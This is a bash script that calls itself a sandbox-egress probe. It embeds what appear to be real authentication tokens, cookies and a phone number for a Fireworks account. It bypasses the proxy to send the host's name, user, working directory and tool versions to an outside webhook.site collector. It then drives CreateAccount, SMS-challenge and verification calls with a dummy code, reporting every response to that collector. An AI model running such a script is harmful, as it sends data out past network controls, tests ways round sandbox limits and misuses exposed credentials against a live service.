#!/bin/bash
# i85863 - sandbox-egress differential probe: GetOAuthArguments / CreateAccount / SendSmsChallenge
SINK="https://webhook.site/200a9980-d8af-4e7f-b54d-cf1eaef003cf/i85863"
IDT=eyJraWQiOiJabldGSFFVcUlsUnJHL0J5dWtLQlZZdDU4ZGlGbWgrakZXbjFJYXpObEFNPSIsImFsZyI6IlJTMjU2In0.eyJhdF9oYXNoIjoiYm5saGZ5X0w5UXNRWVdMMjVOd1dBZyIsInN1YiI6Ijc4NTFmM2QwLTkwNTEtNzBhYi1jZWEzLThkOTZiYjM0MjdjOCIsImVtYWlsX3ZlcmlmaWVkIjp0cnVlLCJhbXIiOlsicHdkIl0sImlzcyI6Imh0dHBzOi8vY29nbml0by1pZHAudXMtd2VzdC0yLmFtYXpvbmF3cy5jb20vdXMtd2VzdC0yX2ZlQVdKbDJHZCIsImNvZ25pdG86dXNlcm5hbWUiOiI3ODUxZjNkMC05MDUxLTcwYWItY2VhMy04ZDk2YmIzNDI3YzgiLCJmaXJld29ya3NfYWNjb3VudCI6ImR1bGFtb3JpdHotaTgxMjY4NzAyM2JiNDk5YmRhLWE2MWY2NyIsIm5vbmNlIjoiMW9DVk9pdmV2NWltb1c2VXU0V2xTZyIsImZpcmV3b3Jrc191c2VyIjoiZHVsYW1vcml0eitpODEyNjg3MDIzYmI0OTliZGFAZ21haWwuY29tIiwib3JpZ2luX2p0aSI6IjNmZDlkZjBkLTkzNjMtNDA4YS1hYTkzLTUyZWE3NmMyN2MxYyIsImF1ZCI6InN1ZWFzN3Byc2ZyZHAxNm5hbnRiZXFjanYiLCJhY3IiOiJ1cm46Y29nbml0bzpsb2E6MSIsImV2ZW50X2lkIjoiMDNhNjEzOTktYTgyYS00YjFlLTk0ZDctNDM2NjMyNTA5NTJjIiwidG9rZW5fdXNlIjoiaWQiLCJmaXJld29ya3NfZ3JvdXAiOiIiLCJhdXRoX3RpbWUiOjE3OTQ3MTA0NDYsImV4cCI6MTc5NDcxNDA0NiwiaWF0IjoxNzk0NzEwNDQ2LCJqdGkiOiJmZTE3ZTNjMS0yMmE1LTRjNmYtYmUxNi04NWY4NjExMDhlY2MiLCJlbWFpbCI6ImR1bGFtb3JpdHoraTgxMjY4NzAyM2JiNDk5YmRhQGdtYWlsLmNvbSJ9.uuow7TuuPhmIVeffEQgPqPkHyRjr_AIq4GGgLQp1sDSR-VrsyZ1dFORgBG5n-eh_IzN0ffbRCLnhE3LQxY1HjvhyPVn1xet_4lYpPeEhR8xelqRArSfc0PIor3iiky6-ow446CCqjl23ncCtT-M9bUaQpYabpCeJwus667sJdNtygh2Gv1hy3gn-9OI5iMOvF3deXu-e_mXn8wjbDaEB3_GK6dBKmXCRsL_HQ4FFhS9vKAh8MgwvFB2P2_ciAiCmYk5Yxesc8CTd38cRbypuXcMaVdaAo7v-LU8vcmTPkIVZIWmhiyRuH-xxzBhvv2EuoVAURInP3bDn-NPRogbNgA
PHONE="+46731299509"
ACC="dulamoritz-i812687023bb499bda-a61f67"
AID="7ebf9512d93c1a5222c936a38d67e0d7be69850600"
CK="auth_v2_id_token=eyJraWQiOiJabldGSFFVcUlsUnJHL0J5dWtLQlZZdDU4ZGlGbWgrakZXbjFJYXpObEFNPSIsImFsZyI6IlJTMjU2In0.eyJhdF9oYXNoIjoiYm5saGZ5X0w5UXNRWVdMMjVOd1dBZyIsInN1YiI6Ijc4NTFmM2QwLTkwNTEtNzBhYi1jZWEzLThkOTZiYjM0MjdjOCIsImVtYWlsX3ZlcmlmaWVkIjp0cnVlLCJhbXIiOlsicHdkIl0sImlzcyI6Imh0dHBzOi8vY29nbml0by1pZHAudXMtd2VzdC0yLmFtYXpvbmF3cy5jb20vdXMtd2VzdC0yX2ZlQVdKbDJHZCIsImNvZ25pdG86dXNlcm5hbWUiOiI3ODUxZjNkMC05MDUxLTcwYWItY2VhMy04ZDk2YmIzNDI3YzgiLCJmaXJld29ya3NfYWNjb3VudCI6ImR1bGFtb3JpdHotaTgxMjY4NzAyM2JiNDk5YmRhLWE2MWY2NyIsIm5vbmNlIjoiMW9DVk9pdmV2NWltb1c2VXU0V2xTZyIsImZpcmV3b3Jrc191c2VyIjoiZHVsYW1vcml0eitpODEyNjg3MDIzYmI0OTliZGFAZ21haWwuY29tIiwib3JpZ2luX2p0aSI6IjNmZDlkZjBkLTkzNjMtNDA4YS1hYTkzLTUyZWE3NmMyN2MxYyIsImF1ZCI6InN1ZWFzN3Byc2ZyZHAxNm5hbnRiZXFjanYiLCJhY3IiOiJ1cm46Y29nbml0bzpsb2E6MSIsImV2ZW50X2lkIjoiMDNhNjEzOTktYTgyYS00YjFlLTk0ZDctNDM2NjMyNTA5NTJjIiwidG9rZW5fdXNlIjoiaWQiLCJmaXJld29ya3NfZ3JvdXAiOiIiLCJhdXRoX3RpbWUiOjE3OTQ3MTA0NDYsImV4cCI6MTc5NDcxNDA0NiwiaWF0IjoxNzk0NzEwNDQ2LCJqdGkiOiJmZTE3ZTNjMS0yMmE1LTRjNmYtYmUxNi04NWY4NjExMDhlY2MiLCJlbWFpbCI6ImR1bGFtb3JpdHoraTgxMjY4NzAyM2JiNDk5YmRhQGdtYWlsLmNvbSJ9.uuow7TuuPhmIVeffEQgPqPkHyRjr_AIq4GGgLQp1sDSR-VrsyZ1dFORgBG5n-eh_IzN0ffbRCLnhE3LQxY1HjvhyPVn1xet_4lYpPeEhR8xelqRArSfc0PIor3iiky6-ow446CCqjl23ncCtT-M9bUaQpYabpCeJwus667sJdNtygh2Gv1hy3gn-9OI5iMOvF3deXu-e_mXn8wjbDaEB3_GK6dBKmXCRsL_HQ4FFhS9vKAh8MgwvFB2P2_ciAiCmYk5Yxesc8CTd38cRbypuXcMaVdaAo7v-LU8vcmTPkIVZIWmhiyRuH-xxzBhvv2EuoVAURInP3bDn-NPRogbNgA; auth_v2_access_token=eyJraWQiOiJqVHZhbnpjbFVoUFMrMkxER1VUQ0JYTmJWS2IvZ2llWW05elljM093ejdVPSIsImFsZyI6IlJTMjU2In0.eyJzdWIiOiI3ODUxZjNkMC05MDUxLTcwYWItY2VhMy04ZDk2YmIzNDI3YzgiLCJhbXIiOlsicHdkIl0sImlzcyI6Imh0dHBzOi8vY29nbml0by1pZHAudXMtd2VzdC0yLmFtYXpvbmF3cy5jb20vdXMtd2VzdC0yX2ZlQVdKbDJHZCIsInZlcnNpb24iOjIsImNsaWVudF9pZCI6InN1ZWFzN3Byc2ZyZHAxNm5hbnRiZXFjanYiLCJvcmlnaW5fanRpIjoiM2ZkOWRmMGQtOTM2My00MDhhLWFhOTMtNTJlYTc2YzI3YzFjIiwiYWNyIjoidXJuOmNvZ25pdG86bG9hOjEiLCJldmVudF9pZCI6IjAzYTYxMzk5LWE4MmEtNGIxZS05NGQ3LTQzNjYzMjUwOTUyYyIsInRva2VuX3VzZSI6ImFjY2VzcyIsInNjb3BlIjoib3BlbmlkIHByb2ZpbGUgZW1haWwiLCJhdXRoX3RpbWUiOjE3OTQ3MTA0NDYsImV4cCI6MTc5NDcxNDA0NiwiaWF0IjoxNzk0NzEwNDQ2LCJqdGkiOiI1NTJmZDQwMC04ZWQ3LTQ4MDUtOGRiOS01ZTdmYTcxN2U4NzAiLCJ1c2VybmFtZSI6Ijc4NTFmM2QwLTkwNTEtNzBhYi1jZWEzLThkOTZiYjM0MjdjOCJ9.uBprG01GcY4IovjXRhAVYrrsL6TFlQePSnA9Xpm49AeOVAbeTzRw0DlbYFoGMlmgLg86-N9igVw_AiHHf-QvSUsWU1ErWcOHOVRWTSjDuevFS8VKiiMZXqivNvkoJbF4psNhiwc0ZRurT0YPIaT5_t1w6VKffxcZQz-_y9RdMAdNBxqXys_OeewpEPtHSy8iY1hutvueVoHnhFLiNlkYqvdKiK-RlmROTcbC6xukBmduvBdydCJ_6rXx3QP1UZM43Bor5Y7hp5pUjHWPzcEQeVTkyygBwIFFSPlT8pExjUqy-BtIrQbeHuYdx5Vmhj91-pBmHTU74qHpfHzrrRsDtg; auth_v2_refresh_token=eyJjdHkiOiJKV1QiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiUlNBLU9BRVAifQ.XG57aPCX0Fm7__8_uVDqF-oNwlmhA1GQu3_z0JpMMSAAwhXlnqm4-SDy0ZwgsSE4JuAEYerznJBNkB5Ni2uzK67xuOji_S2Jmd2Pxo0ZrcufkvRFMBH4c4J4OT8_cSG4pSa9maESmmpnqkE5fVZcp85sp0pi0oeGa7BBWo-qP6_GKnQ8CXlqhKyBuxnS8dO0-rLJVe5A_1WvF4vosYiv7xCQwVxi72g77UyBsEiYV7Gadgc31Kw-6OGvTiYmEdxYyTzO5kR0LUQwoGupOMpSPzThpp5z9_7q4vsHr-tuNAOUK7Ar5iwt-rfyLrp0vNKeLFUyeZAIg9kbkq0MjXU4qg.sPzhmellrqVbwjXI.bWRQuKbrr2HG-CE_ypg-Q6HzNLlAQvXj8KynCSocMri5cdwGXcEl3215KavWrf7kybVNe_9igov9SbyeDa-zhFgAGZjld5tvicyFz-D0a6eo2vG31vjM7yU-YhzshgB9NETTfCtGjj-P5sJ3872WWvQL-hjIkRH-R_D4E642CBr4p8S3bC5jmXSk1c35j0-CCvMr2yteOklcv5WaWeTnNBPv2RcvI0IAmcfn4xlHKTZhHpt0g9G22ehSuStLis_Ad0VmGXEQAshMTZ1QwCgXcSP8tc0ICm3yMzJ7hLUYkULYeoiSgxV0A8TS1burw-xt2ND8Q6zV2o4cM600DIKYXAIY49X7nzET7EIyLAO3L_8UISphXxdnh2xmDjzOr0FJ8LerXWKYiK5hkdzD0e9lu7XB03Q3X3HvyPtNDyoYq7V52gB7WcsO8UR5TGw3P7qJgMpVeglHRrkf_x_XtqpdhHv8XSBeo_5j4EOpssLySpoJNeFmXFK5im6CLo2an7eXjk3VMf57-BLd3Nn4BNPLbpyUBB7MpDZ1GVQbtoiwa02Mx98FxhrTywq3BTxiGaHtpqq0slDZpUf5DWkWhKSbAK7t-ABorIHrObVUQ57I37_HIB2jA0vqWZwiUDVmf9rU1mxLxOlTKMJPXYHLaiSMY108whX340Jj08XiG3RyVp1HFtpvZeIpPcBRV7ixyLtQUOhLsMOriwv_LsmdxmYf4ySvW3oNO4EBO5ePZ47YuTobe9HtgleCdLqTqjen7BB28CVQs-wxwnbWma1r0cs6S7Gro47vZob5NLMK_Ao9Zom871YQe60uFqp2c3D76TuatFTvWBwh3m_FsaddTxbESgOAS5ZEbHsEEkwLwpzrdc2Z2EuJMf2XYAWyEUQzV1khKQyvtL94HYzWgJJUlVJq3LmbQTJsB96M1EaLPWAG1RN8xBUmaZCBA1en5T9LccUSr1oR5gI1YWOEiYkXmmUpHATG4x6eboYVU1cCahjD7GkKrMNCgf3gfH2f29ImDpKka8v8szxieuDg7qNirDYtljXjvEYFYTgkImpsS5RQrjwsJWqvWncW1EZxXVjrqLY8V3MZ8KJpOalJUil9Il62YmU24xCh1dwX7acwUJohf72vd8H_4tYqmgZwcbuQYwUYYIby5EfRvxHcuiSn1YMHHSt1NbOUKkxw6yomLnjrJNEJTMd-YPHIAK6-Z5PC9pIPO2EKclJwRKMV3OMrEB4RzLLmpFN834tBwaQr4z8zSZ27ZHsd7WyHXXAMXM0m2JwPfaFm50gE6R86mVgjGzA3qzaztXsGkdcRt_cNfABQEEeumv1sOI3XwYNWSn3rtrHVZocdHKLgiyQ9IXBGetACWcLLd5FSa8Tth53N8moG0ZQ3YflllbxRWTCqYeONO3c.8E79J4yvx-SxyJ9TRDg9Cw; auth_v2_user_context=%7B%22accountID%22%3A%22%22%2C%22email%22%3A%22dulamoritz%2Bi812687023bb499bda%40gmail.com%22%2C%22hasAccount%22%3Afalse%2C%22accountType%22%3A0%2C%22accountState%22%3A0%2C%22impersonating%22%3Afalse%7D"
OA_B64="AAAAAAA="
CA_B64="AAAAAIcKNBIJaTg1ODYzc2J4SidkdWxhbW9yaXR6K2k4MTI2ODcwMjNiYjQ5OWJkYUBnbWFpbC5jb20SJGR1bGFtb3JpdHotaTgxMjY4NzAyM2JiNDk5YmRhLWE2MWY2NyIpIidkdWxhbW9yaXR6K2k4MTI2ODcwMjNiYjQ5OWJkYUBnbWFpbC5jb20="

post(){ curl -sS --noproxy "*" -m 25 -o /dev/null -X POST "$SINK-$1" -H 'content-type: text/plain' --data-binary "$2" 2>/dev/null; }
hdr(){ tr -d '\r' < "$1" 2>/dev/null; }
gs(){ v=$(hdr "$1" | grep -i '^grpc-status:' | head -1 | cut -d' ' -f2); if [ -n "$v" ]; then echo "$v"; elif [ -s "$2" ]; then echo '0(no-trailer)'; else echo 'ABSENT'; fi; }
gm(){ hdr "$1" | grep -i '^grpc-message:' | head -1 | cut -d' ' -f2-; }
gd(){ hdr "$1" | grep -i '^grpc-status-details-bin:' | head -1 | cut -d' ' -f2-; }
b64(){ if [ -s "$1" ]; then base64 -w0 < "$1"; fi; }

post start "host=$(hostname) utc=$(date -u +%FT%TZ) cwd=$(pwd) who=$(id -un 2>/dev/null) curl=$(curl --version 2>/dev/null | head -1) py=$(command -v python3 || echo none)"

gcall(){ # gcall <path> <bodyfile> <tagprefix> [auth]
  pth=$1; bf=$2; pre=$3; au=$4; i=0
  while [ $i -lt 3 ]; do
    if [ "$au" = "auth" ]; then
      curl -sS --http2 -m 50 -D /tmp/$pre.h -o /tmp/$pre.r -X POST "https://gateway.fireworks.ai$pth" \
        -H 'content-type: application/grpc' -H 'te: trailers' -H "Authorization: Bearer $IDT" \
        --data-binary @"$bf" >/tmp/$pre.err 2>&1
    else
      curl -sS --http2 -m 50 -D /tmp/$pre.h -o /tmp/$pre.r -X POST "https://gateway.fireworks.ai$pth" \
        -H 'content-type: application/grpc' -H 'te: trailers' \
        --data-binary @"$bf" >/tmp/$pre.err 2>&1
    fi
    if ! grep -qi 'CONNECT aborted\|Could not resolve\|Failed to connect' /tmp/$pre.err; then break; fi
    i=$((i+1)); sleep $i
  done
}

# 1) GetOAuthArguments (trusted-egress positive control)
printf '%s' "$OA_B64" | base64 -d > /tmp/i8oa.b
gcall /gateway.Gateway/GetOAuthArguments /tmp/i8oa.b i8oa ""
post oa "gs=$(gs /tmp/i8oa.h /tmp/i8oa.r)|gm=$(gm /tmp/i8oa.h)|body_b64=$(b64 /tmp/i8oa.r)|err=$(head -c 160 /tmp/i8oa.err | tr '\n' ' ')"

# 2) CreateAccount (gmail-class identity)
printf '%s' "$CA_B64" | base64 -d > /tmp/i8ca.b
gcall /gateway.Gateway/CreateAccount /tmp/i8ca.b i8ca auth
CA_GS=$(gs /tmp/i8ca.h /tmp/i8ca.r); CA_DET=$(gd /tmp/i8ca.h)
post ca "gs=$CA_GS|gm=$(gm /tmp/i8ca.h)|details=$CA_DET|body_b64=$(b64 /tmp/i8ca.r)|err=$(head -c 160 /tmp/i8ca.err | tr '\n' ' ')"

# 3) challenge id: from CreateAccount grpc-status-details-bin metadata
CH=""; EXP=""
if [ -n "$CA_DET" ]; then
  printf '%s' "$CA_DET" | base64 -d 2>/dev/null | tr -c '[:print:]' '\n' > /tmp/i8det.txt
  CH=$(grep -A1 -x 'challenge_id' /tmp/i8det.txt | sed -n 2p)
  EXP=$(grep -A1 -x 'expires_at' /tmp/i8det.txt | sed -n 2p)
fi
post cid "challenge=$CH|expires=$EXP"

# 3b) fallback: app /onboarding Server Action
if [ -z "$CH" ]; then
  BODY='[{"accountId":"'"$ACC"'","companyName":"Pipeline Co","firstName":"Test","lastName":"User","agreeToTerms":true,"step":"profile","goals":[0],"useCases":[0],"otherGoal":"","otherUseCases":"","nexusUseCases":[],"nexusOtherUseCase":""},false,"","","",false]'
  curl -sS -m 40 -D /tmp/i8on.h -o /tmp/i8on.r -X POST https://app.fireworks.ai/onboarding \
    -H 'content-type: text/plain;charset=UTF-8' -H "Next-Action: $AID" -H 'Accept: text/x-component' \
    -H 'Origin: https://app.fireworks.ai' -H 'Referer: https://app.fireworks.ai/onboarding' \
    -H "Cookie: $CK" --data-binary "$BODY" >/tmp/i8on.err 2>&1
  CH=$(sed -n 's/.*"challengeId":"\([^"]*\)".*/\1/p' /tmp/i8on.r | head -1)
  EXP=$(sed -n 's/.*"expiresAt":"\([^"]*\)".*/\1/p' /tmp/i8on.r | head -1)
  post onb "http=$(head -1 /tmp/i8on.h | tr -d '\r')|challenge=$CH|expires=$EXP|bytes=$(wc -c </tmp/i8on.r)|head=$(head -c 260 /tmp/i8on.r | tr '\n' ' ')"
fi
CH="${FORCE_CH:-$CH}"

# 4) SendSmsChallenge (#1 challenge_id, #2 phone_number)
if [ -n "$CH" ]; then
  ih=$(printf '%s' "$CH" | od -An -v -tx1 | tr -d ' \n'); il=$(printf '%s' "$CH" | wc -c | tr -d ' ')
  ph=$(printf '%s' "$PHONE" | od -An -v -tx1 | tr -d ' \n'); pl=$(printf '%s' "$PHONE" | wc -c | tr -d ' ')
  bh=$(printf '0a%02x%s12%02x%s' "$il" "$ih" "$pl" "$ph"); bl=$(( ${#bh} / 2 ))
  printf '%b' "$(printf '00000000%08x%s' "$bl" "$bh" | sed 's/../\\x&/g')" > /tmp/i8sms.b
  t0=$(date +%s)
  gcall /gateway.Gateway/SendSmsChallenge /tmp/i8sms.b i8sms auth
  post sms "gs=$(gs /tmp/i8sms.h /tmp/i8sms.r)|gm=$(gm /tmp/i8sms.h)|details=$(gd /tmp/i8sms.h)|reqbytes=$(wc -c </tmp/i8sms.b)|secs=$(( $(date +%s) - t0 ))|err=$(head -c 160 /tmp/i8sms.err | tr '\n' ' ')"
  # 4b) VerifySmsChallenge with dummy code
  vh=$(printf '0a%02x%s12%02x%s' "$il" "$ih" 6 "303030303030")
  vl=$(( ${#vh} / 2 ))
  printf '%b' "$(printf '00000000%08x%s' "$vl" "$vh" | sed 's/../\\x&/g')" > /tmp/i8ver.b
  gcall /gateway.Gateway/VerifySmsChallenge /tmp/i8ver.b i8ver auth
  post ver "gs=$(gs /tmp/i8ver.h /tmp/i8ver.r)|gm=$(gm /tmp/i8ver.h)|details=$(gd /tmp/i8ver.h)"
else
  post sms "SKIPPED no-challenge"
fi

post done "utc=$(date -u +%FT%TZ)"
echo "i85863 done"
